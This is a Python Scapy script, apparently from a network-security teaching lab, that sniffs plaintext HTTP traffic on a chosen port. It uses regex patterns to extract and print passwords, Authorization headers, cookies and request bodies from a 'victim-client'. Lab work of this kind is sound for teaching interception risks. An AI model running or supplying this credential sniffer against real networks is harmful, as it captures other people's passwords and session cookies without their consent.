#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re

from scapy.all import IP, TCP, Raw, sniff

from common import iface, print_banner, require_root_hint, setup_scapy


SENSITIVE_PATTERNS = [
    re.compile(rb"password=([^&\s]+)", re.I),
    re.compile(rb"passwd=([^&\s]+)", re.I),
    re.compile(rb"Authorization:\s*([^\r\n]+)", re.I),
    re.compile(rb"Cookie:\s*([^\r\n]+)", re.I),
]


def handle_packet(pkt):
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
        return

    load = bytes(pkt[Raw].load)

    if not (load.startswith(b"GET ") or load.startswith(b"POST ") or b"HTTP/" in load[:20]):
        return

    src = f"{pkt[IP].src}:{pkt[TCP].sport}"
    dst = f"{pkt[IP].dst}:{pkt[TCP].dport}"

    first_line = load.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
    print(f"\n[HTTP] {src} -> {dst} {first_line}")

    for pattern in SENSITIVE_PATTERNS:
        match = pattern.search(load)
        if match:
            value = match.group(1).decode("utf-8", errors="replace")
            print(f"  posible dato sensible: {pattern.pattern.decode(errors='replace')} => {value}")

    if b"\r\n\r\n" in load:
        body = load.split(b"\r\n\r\n", 1)[1]
        if body:
            print(f"  body: {body[:200].decode('utf-8', errors='replace')}")


def main():
    parser = argparse.ArgumentParser(description="Sniffer HTTP de laboratorio con Scapy.")
    parser.add_argument("--iface", default=iface())
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    require_root_hint()
    setup_scapy()

    print_banner(f"HTTP sniff lab tcp port {args.port}")
    print("[*] Genera tráfico desde victim-client. Ctrl+C para salir.")

    sniff(
        iface=args.iface,
        filter=f"tcp port {args.port}",
        prn=handle_packet,
        store=False,
    )


if __name__ == "__main__":
    main()
